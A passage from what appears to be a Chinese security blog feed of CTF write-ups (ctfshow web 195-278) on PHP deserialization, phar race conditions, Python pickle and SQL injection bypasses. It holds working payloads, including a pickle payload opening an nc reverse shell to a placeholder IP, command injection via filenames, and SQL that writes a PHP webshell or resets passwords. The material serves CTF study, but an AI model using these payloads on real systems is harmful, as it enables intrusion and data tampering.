punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">files</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>$lin</code>  GET 赋值</p>\n<h1 id=\"web-275\"><a class=\"anchor\" href=\"#web-275\">#</a> web 275</h1>\n<p><code>__destruct</code>  当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要 <code>$this-&gt;evilfile</code>  是 <code>true</code>  就可以执行系统命令了。最后再拼接一下命令<br>\n payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span><span class=\"token keyword\">fn</span><span class=\"token operator\">=</span><span class=\"token punctuation\">;</span>cat f<span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>data<span class=\"token punctuation\">:</span> flag<span class=\"token operator\">=</span><span class=\"token number\">123</span></pre></td></tr></tbody></table></figure><h1 id=\"web-276\"><a class=\"anchor\" href=\"#web-276\">#</a> web 276</h1>\n<p>在上个题的基础上增了了判断 <code>$this-&gt;admin</code>  所以真的需要我们去通过反序列化修改 <code>admin</code>  的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>\n因为题目中有写文件的函数，所以可以通过 <code>file_put_contents</code>  写 <code>phar</code>  文件，然后再通过 <code>file_put_contents</code>  触发 <code>phar</code>  反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>\n生成 <code>phar</code>  文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">filter</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1|cat f*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filecontent</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evilfile</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>条件竞争</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./phar.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">work1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"?fn=a\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">work2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">global</span> flag</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"?fn=phar://phar.phar/\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">\"flag{\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text <span class=\"token keyword\">and</span> flag <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">while</span> flag <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    a <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>work1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    b <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>work2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    a<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    b<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-277-278\"><a class=\"anchor\" href=\"#web-277-278\">#</a> web 277 278</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pickle</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__import__(\"os\").popen(\"nc xxx.xxx.xxx.xxx 4567 -e /bin/sh\").read()'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a<span class=\"token operator\">=</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>test<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/35cb7ca5/",
            "url": "http://dpm12345.cn/posts/35cb7ca5/",
            "title": "SQL 注入",
            "date_published": "2022-10-04T14:15:40.000Z",
            "content_html": "<ul>\n<li>\n<p>若对返回值进行过滤</p>\n<ul>\n<li>\n<p>可以在该字段名前加上 <code>hex()</code>  十六进制编码</p>\n</li>\n<li>\n<p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p>\n</li>\n</ul>\n</li>\n<li>\n<p>sql 注入也可以将内容写入到外部文件中，</p>\n<p>如 <code>select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile '/var/www/html/1.php'</code></p>\n<p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p>\n<p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code>  下的 <code>config.php</code>  文件中)</p>\n<p>之后找到 flag</p>\n</li>\n<li>\n<p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p>\n<p>其中 <code>%</code>  匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p>\n<p>如 <code>select id,username,password from users where username=0x666c6167;</code>  也是可以的，查询出 <code>username='flag'</code>  的情况</p>\n<p>或者用 <code>base64</code>  编码</p>\n</li>\n<li>\n<p>where 被过滤可以使用 having，同 where 用法</p>\n</li>\n<li>\n<p>若 ban 了数字，那么可以使用 <code>true，false</code>  来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code>  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p>\n<p><code>select username,password from users where id=concat(true,true);</code></p>\n<p>等价于 <code>select username,password from users where id='11';</code></p>\n</li>\n<li>\n<p>对于 select 的查询语句</p>\n<p><code>select count(*) from users where username='8' or 'a23';</code></p>\n<p>返回结果是 0</p>\n<p><code>select count(*) from users where username='8' or '1a';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '1';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '0';</code></p>\n<p>返回结果是 0</p>\n<p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p>\n<p>可利用该特性进行 SQL 注入</p>\n</li>\n<li>\n<p>sql 语句的查询机制</p>\n</li>\n<li>\n<p>如 sql 语句 <code>select username,password from users where username='flag';</code></p>\n<p>它将会返回 <code>username</code>  为 <code>flag</code>  的值的数据</p>\n<p>但如果此时将 <code>username='flag'</code>  换为 <code>username=0</code>  后，是否还能查到 flag 呢？</p>\n<p>答案是肯定的，这是因为，这里的等于是弱等于，</p>\n</li>\n<li>\n<p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p>\n<p>如 <code>select left(\"abc\",2);</code>  返回 <code>ab</code></p>\n<p>或者也可以使用 <code>lpad</code> ，其有三个参数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>LPAD<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">,</span>padstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Returns</span> the string str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">left</span><span class=\"token operator\">-</span>padded <span class=\"token keyword\">with</span> the string padstr <span class=\"token keyword\">to</span> a length <span class=\"token keyword\">of</span> len characters<span class=\"token punctuation\">.</span> <span class=\"token keyword\">If</span> str <span class=\"token operator\">is</span> longer than len<span class=\"token punctuation\">,</span> the <span class=\"token keyword\">return</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">is</span> shortened <span class=\"token keyword\">to</span> len characters<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'??hi'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'h'</span></pre></td></tr></tbody></table></figure><p>那么可以 <code>lpad(\"abc\",2,\"\");</code>  达到与 left 同样效果</p>\n</li>\n<li>\n<p>时间盲注</p>\n<p><strong>sleep(3)</strong> 直截了当的时间盲注</p>\n<p><strong>benchmark()</strong></p>\n<p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p>\n<p><strong>rlike</strong> 正则匹配</p>\n<p><strong>多次查询排序</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure></li>\n</ul>\n<h1 id=\"web-195\"><a class=\"anchor\" href=\"#web-195\">#</a> web 195</h1>\n<p>查询语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"登陆成功 flag is <span class=\"token interpolation\"><span class=\"token variable\">$flag</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以使用修改表的方法</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">update</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">set</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><p>将密码重置为 1</p>\n<h1 id=\"web-197\"><a class=\"anchor\" href=\"#web-197\">#</a> web 197</h1>\n<p>查询语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = {$username};\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/\\*|\\#\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>{</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    die<span class=\"token 